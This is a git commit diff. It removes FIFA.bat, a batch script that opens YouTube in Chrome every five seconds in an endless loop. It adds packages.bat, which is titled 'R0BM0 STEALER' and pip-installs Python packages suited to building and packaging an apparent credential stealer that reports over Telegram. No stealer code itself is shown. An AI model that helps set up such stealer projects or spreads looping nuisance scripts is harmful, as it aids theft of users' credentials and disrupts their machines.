2d76cbf229a32c356796fb11e7a87d093a3c1fb4
matiasb186 <86837307+matiasb186@users.noreply.github.com>
2023-10-16 16:20:49 -0500

    Update and rename FIFA.bat to packages.bat

--- FIFA.bat
+++
@@ -1,7 +0,0 @@
-@echo off
-:loop
-start chrome "https://www.youtube.com"
-timeout /t 5 /nobreak > nul
-start chrome "https://www.youtube.com"
-timeout /t 5 /nobreak > nul
-goto loop
---
+++ packages.bat
@@ -0,0 +1,27 @@
+@echo off
+
+title R0BM0 STEALER
+
+python.exe -m pip install --upgrade pip
+
+pip install requests
+pip install pycryptodome
+pip install pystyle
+pip install colorama
+pip install auto_py_to_exe
+pip install pyinstaller
+pip install wmi
+pip install psutil
+pip install cryptography
+pip install pypiwin32
+pip install requests-toolbelt
+pip install cx-Freeze
+pip install pyuac
+pip install pillow
+pip install customtkinter
+pip install pyautogui
+pip install telegram
+pip install pycryptodome
+pip install Pillow
+pip install pybase64
+pip install python-telegram-bot
